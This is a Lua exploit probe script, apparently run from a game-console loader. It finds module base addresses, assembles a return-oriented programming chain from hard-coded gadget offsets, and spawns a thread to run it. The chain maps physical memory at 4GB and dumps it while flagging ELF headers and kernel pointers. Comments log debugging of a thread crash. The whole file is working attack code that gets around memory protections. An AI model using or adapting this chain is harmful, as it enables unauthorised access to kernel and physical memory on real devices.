-- CRASH_CLASS: LOW
-- PROBE 562g: Physical memory read — clean output via fn_addr + thr_exit
--
-- ROOT CAUSE FOUND: "77" binary comes from child thread CRASH, not gadget exec.
-- 384b proves: fn_addr dispatch + thr_exit(431) = zero binary output.
--
-- Fix: end child chain with pop_rdi→0, pop_rax→431, fn_addr (clean exit).
-- No crash → no "77" → clean text output. print() works normally.
--
-- Reads 16 qwords from phys 0x100000000 (4GB) via MapDirectMemory.

print("=== PROBE 562g: PHYS READ (fn_addr + thr_exit) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do wd(buf + off, 0) end
end

local Z = uint64(0)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- fn_addr from the loader's pipe object — THE correct syscall dispatcher
local fn_addr = syscall.pipe.fn_addr
print("fn_addr=" .. tostring(fn_addr))

-- Eboot + libkernel
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", eb_hi, eb_lo, lk_hi, lk_lo))

-- Gadgets
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rax_ret     = eboot + uint64(0x992)
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4)  -- mov rax,[rsi]; ret
local mov_mem_rdi_rax = eboot + uint64(0x92C67)   -- mov [rdi],rax; ret
local bare_ret        = eboot + uint64(0x42)

-- ============================================================
-- STEP 1: MapDM phys 0x100000000 (4GB)
-- ============================================================
local mapped_va = uint64("0x880000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999
print(string.format("MapDM(0x100000000) rv=%d", md_rv))
io.flush()

if md_rv ~= 0 then
    print("MapDM FAILED")
    return
end

-- ============================================================
-- STEP 2: Build child ROP chain
-- ============================================================
local shared = memory.alloc(0x200)
zero(shared, 0x200)
local nq = 16

local ss = 0x4000
local ok_stk, sb = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
if not ok_stk then
    print("stack alloc FAIL")
    return
end

local sb_n = N(sb)
local rsp_n = (sb_n + ss) - ((sb_n + ss) % 16) - 8
local rsp = sb + uint64(rsp_n - sb_n)

local ci = 0
local function wc(val) wq(rsp + uint64(ci * 8), val); ci = ci + 1 end

-- Read 16 qwords: mapped_va+i*8 → shared+8+i*8
for qi = 0, nq - 1 do
    wc(pop_rsi_ret)
    wc(mapped_va + uint64(qi * 8))
    wc(mov_rax_mem_rsi)
    wc(pop_rdi_ret)
    wc(shared + uint64(8 + qi * 8))
    wc(mov_mem_rdi_rax)
end

-- Sentinel
wc(pop_rax_ret)
wc(uint64("0xDEADFACE"))
wc(pop_rdi_ret)
wc(shared)
wc(mov_mem_rdi_rax)

-- Clean exit: thr_exit(431) via fn_addr
wc(pop_rdi_ret)
wc(Z)                  -- exit status = 0
wc(pop_rax_ret)
wc(uint64(431))        -- thr_exit
wc(fn_addr)            -- dispatch

-- Safety padding
for i = 1, 8 do wc(bare_ret) end

print(string.format("chain=%d gadgets", ci))

-- ============================================================
-- STEP 3: Spawn child
-- ============================================================
local pa = memory.alloc(0x40)
zero(pa, 0x40)
wq(pa + 0x00, bare_ret)
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_buf = memory.alloc(8)
wq(tid_buf, Z)
wq(pa + 0x30, uint64(tid_buf))

pcall(function() sc455(uint64(pa), uint64(0x38)) end)

-- ============================================================
-- STEP 4: Wait for sentinel
-- ============================================================
local found = false
for wait = 1, 5000 do
    for j = 1, 200 do local x = j * j end
    local s = rb(shared) or 0
    if s == 0xDEADFACE then found = true; break end
end

-- ============================================================
-- STEP 5: Print results (should be clean — no "77"!)
-- ============================================================
print("")
print("========================================")

if found then
    print("PHYSICAL MEMORY READ SUCCESS!")
    print("phys=0x100000000 (4GB), 16 qwords:")
    print("")
    for qi = 0, nq - 1 do
        local lo = rb(shared + 8 + qi * 8) or 0
        local hi = rb(shared + 8 + qi * 8 + 4) or 0
        local tag = ""
        if qi == 0 and lo == 0x464C457F then tag = " *** ELF HEADER! ***" end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("  [+%02X] 0x%08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    local sv = rb(shared) or 0
    print(string.format("TIMEOUT sentinel=0x%X", sv))
end

-- Cleanup
pcall(function() sc73(mapped_va, uint64(0x4000)) end)
pcall(function() sc73(sb, uint64(ss)) end)

io.flush()
print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 562g DONE ===")
